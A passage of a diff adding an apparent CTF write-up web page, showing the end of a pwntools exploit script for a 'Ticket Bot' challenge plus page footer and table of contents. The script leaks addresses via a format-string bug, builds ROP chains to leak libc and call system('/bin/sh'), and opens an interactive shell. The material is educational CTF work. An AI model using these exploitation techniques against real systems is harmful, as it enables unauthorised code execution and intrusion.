+    <span style="color:#66d9ef">return</span> int(str(x, <span style="color:#e6db74">&#34;utf-8&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;here is your ticketID &#34;</span>)
+print(str(io<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;utf-8&#34;</span>), new_ticket(io))
+
+password <span style="color:#f92672">=</span> bytes(input(<span style="color:#e6db74">&#34;Input Password:&#34;</span>), <span style="color:#e6db74">&#34;utf-8&#34;</span>)
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2. Service Login&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(password)
+
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%9$p&#34;</span>)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Password changed to</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;==&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]
+base_addr <span style="color:#f92672">=</span> int(str(leak, <span style="color:#e6db74">&#34;utf-8&#34;</span>), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">5167</span>
+
+print(<span style="color:#e6db74">&#34;Base Address:&#34;</span>, hex(base_addr))
+
+POP_RDI <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000001653</span> <span style="color:#f92672">+</span> base_addr
+RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000000101a</span> <span style="color:#f92672">+</span> base_addr
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+=</span> p64(RET)
+payload <span style="color:#f92672">+=</span> p64(POP_RDI)
+payload <span style="color:#f92672">+=</span> p64(lbin<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>] <span style="color:#f92672">+</span> base_addr)
+payload <span style="color:#f92672">+=</span> p64(lbin<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;puts&#34;</span>] <span style="color:#f92672">+</span> base_addr)
+payload <span style="color:#f92672">+=</span> p64(RET)
+payload <span style="color:#f92672">+=</span> p64(lbin<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;AdminMenu&#34;</span>] <span style="color:#f92672">+</span> base_addr)
+print(<span style="color:#e6db74">&#34;Payload:&#34;</span>, payload)
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2. Service Login&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(payload)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaa&#34;</span>)
+libc_puts <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+libc_puts <span style="color:#f92672">+=</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> len(libc_puts)) <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+libc_base <span style="color:#f92672">=</span> u64(libc_puts) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;puts&#34;</span>]
+print(<span style="color:#e6db74">&#34;Libc Base:&#34;</span>, hex(libc_base))
+
+
+BINSH <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000001b45bd</span> <span style="color:#f92672">+</span> libc_base
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+=</span> p64(POP_RDI)
+payload <span style="color:#f92672">+=</span> p64(BINSH)
+payload <span style="color:#f92672">+=</span> p64(RET)
+payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>] <span style="color:#f92672">+</span> libc_base)
+
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+io<span style="color:#f92672">.</span>sendline(payload)
+
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+</details>
+
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+	    
+            <div class="next-post">
+                <a href="https://civiled.io/writeups/htb-control-room/?ref=footer"><span style="font-weight:bold;">Next »</span><br>HackTheBox - Control Room</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#binary-manipulation">Binary Manipulation</a>
+      <ul>
+        <li><a href="#exploit">Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#ticket-bot-v1">Ticket Bot V1</a>
+      <ul>
+        <li><a href="#seed-cracker">Seed Cracker</a></li>
+        <li><a href="#admin-exploit">Admin Exploit</a></li>
+        <li><a href="#ret2libc">Ret2Libc</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
